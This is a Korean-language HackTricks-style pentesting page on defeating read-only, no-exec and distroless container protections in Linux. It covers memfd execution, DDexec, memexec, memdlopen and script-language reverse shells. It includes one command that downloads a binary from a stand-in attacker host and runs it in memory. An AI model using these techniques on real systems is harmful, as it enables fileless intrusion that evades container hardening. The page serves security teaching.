# FS protections 우회: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}


## 동영상

다음 동영상에서 이 페이지에 언급된 기술을 더 자세히 확인할 수 있습니다:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec 시나리오

특히 컨테이너에서 **read-only (ro) file system protection**이 적용된 상태로 mount된 Linux 시스템을 점점 더 자주 볼 수 있습니다. `securitycontext`에서 **`readOnlyRootFilesystem: true`**를 설정하는 것만으로도 ro file system을 사용하는 컨테이너를 실행할 수 있기 때문입니다:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

하지만 file system이 ro로 mount되어 있어도 **`/dev/shm`**은 여전히 writable이므로, disk에 아무것도 쓸 수 없는 것은 아닙니다. 그러나 이 폴더에는 **no-exec protection**이 적용되어 mount되므로, 여기에 binary를 다운로드해도 **실행할 수 없습니다**.

> [!WARNING]
> Red team 관점에서는 시스템에 이미 존재하지 않는 binary(예: backdoor 또는 `kubectl`과 같은 enumerator)를 **다운로드하고 실행하는 것이 복잡해집니다**.

## 가장 쉬운 우회: Scripts

앞에서 binary를 언급했지만, interpreter가 시스템 내부에 존재하는 한 **어떤 script든 실행할 수 있습니다**. 예를 들어 `sh`가 있으면 **shell script**를, `python`이 설치되어 있으면 **python** **script**를 실행할 수 있습니다.

하지만 이것만으로는 binary backdoor나 실행해야 할 다른 binary tool을 실행하기에 충분하지 않습니다.

## Memory Bypasses

binary를 실행하고 싶지만 file system이 이를 허용하지 않는다면, 가장 좋은 방법은 **memory에서 실행하는 것**입니다. **protection이 memory에는 적용되지 않기 때문입니다**.

### FD + exec syscall bypass

시스템 내부에 **Python**, **Perl**, **Ruby**와 같은 강력한 script engine이 있다면, 실행할 binary를 memory에 다운로드하고, 해당 binary를 memory file descriptor(`create_memfd` syscall)에 저장할 수 있습니다. 이 file descriptor에는 이러한 protection이 적용되지 않으며, 이후 **`exec` syscall**을 호출하면서 **실행할 file로 fd를 지정**할 수 있습니다.

이를 위해 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project를 쉽게 사용할 수 있습니다. 여기에 binary를 전달하면 지정한 language로 script를 생성합니다. 이 script에는 **compressed 및 b64 encoded된 binary**와 이를 **decode 및 decompress**하여 `create_memfd` syscall 호출로 생성한 **fd**에 저장한 뒤, **exec** syscall을 호출하여 실행하는 instructions가 포함됩니다.

> [!WARNING]
> PHP나 Node와 같은 다른 scripting language에서는 작동하지 않습니다. 이러한 language에는 script에서 **raw syscall을 호출하는 기본 방법이 없기** 때문에, binary를 저장할 **memory fd**를 생성하기 위한 `create_memfd` 호출이 불가능합니다.
>
> 또한 `/dev/shm`에 file을 생성하여 **regular fd**를 만들어도 작동하지 않습니다. **no-exec protection**이 적용되므로 해당 file을 실행할 수 없기 때문입니다.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec)은 자체 process의 **`/proc/self/mem`**을 overwrite하여 **process의 memory를 수정**할 수 있게 하는 technique입니다.

따라서 process가 실행 중인 **assembly code를 제어**할 수 있으므로, **shellcode**를 작성하고 process를 "mutate"하여 **임의의 code를 실행**할 수 있습니다.

> [!TIP]
> **DDexec / EverythingExec**을 사용하면 자체 **shellcode** 또는 **어떤 binary든** **memory에서** load하고 **실행**할 수 있습니다.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
이 technique에 대한 자세한 정보는 Github 또는 다음을 확인하세요:


{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec)는 DDexec의 자연스러운 다음 단계입니다. 이는 **DDexec shellcode를 daemon화한 것**이므로, **다른 binary를 실행**할 때마다 DDexec를 다시 실행할 필요가 없습니다. DDexec technique을 통해 memexec shellcode를 실행한 다음, 이 **daemon과 통신하여 로드하고 실행할 새로운 binary를 전달**하면 됩니다.

[https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php)에서 **PHP reverse shell에서 memexec를 사용하여 binary를 실행**하는 방법의 예시를 확인할 수 있습니다.

### Memdlopen

DDexec와 비슷한 목적을 가진 [**memdlopen**](https://github.com/arget13/memdlopen) technique은 binary를 memory에 **더 쉽게 로드**한 다음 실행할 수 있도록 합니다. dependency가 있는 binary도 로드할 수 있습니다.

## Distroless Bypass

**distroless가 실제로 무엇인지**, 언제 유용하고 언제 그렇지 않은지, 그리고 container에서 post-exploitation tradecraft를 어떻게 변경하는지에 대한 전용 설명은 다음을 확인하세요:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless container에는 특정 application 또는 service를 실행하는 데 필요한 **최소한의 component만 포함**됩니다. 예를 들어 library와 runtime dependency는 포함되지만, package manager, shell 또는 system utility와 같은 더 큰 component는 제외됩니다.

Distroless container의 목표는 **불필요한 component를 제거하여 container의 attack surface를 줄이고**, exploit할 수 있는 vulnerability의 수를 최소화하는 것입니다.

### Reverse Shell

Distroless container에서는 일반적인 shell을 얻는 데 필요한 **`sh` 또는 `bash`조차 찾지 못할 수 있습니다**. 또한 `ls`, `whoami`, `id`와 같은 binary도 찾을 수 없습니다. 즉, system에서 일반적으로 실행하는 모든 것이 없습니다.

> [!WARNING]
> 따라서 평소처럼 **reverse shell**을 얻거나 system을 **enumerate**할 수 없습니다.

그러나 compromised container가 예를 들어 flask web을 실행 중이라면 python이 설치되어 있으므로 **Python reverse shell**을 얻을 수 있습니다. node를 실행 중이라면 Node rev shell을 얻을 수 있으며, 대부분의 **scripting language**에서도 동일합니다.

> [!TIP]
> scripting language를 사용하면 해당 language의 기능을 이용하여 **system을 enumerate**할 수 있습니다.

**`read-only/no-exec`** protection이 없다면 reverse shell을 악용하여 **file system에 binary를 작성**하고 이를 **execute**할 수 있습니다.

> [!TIP]
> 그러나 이러한 종류의 container에는 일반적으로 이러한 protection이 존재합니다. 이 경우 **앞서 설명한 memory execution technique을 사용하여 이를 bypass**할 수 있습니다.

[**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE)에서 일부 **RCE vulnerability를 exploit**하여 scripting language의 **reverse shell**을 얻고 memory에서 binary를 실행하는 방법의 **example**을 확인할 수 있습니다.


{{#include ../../../../banners/hacktricks-training.md}}
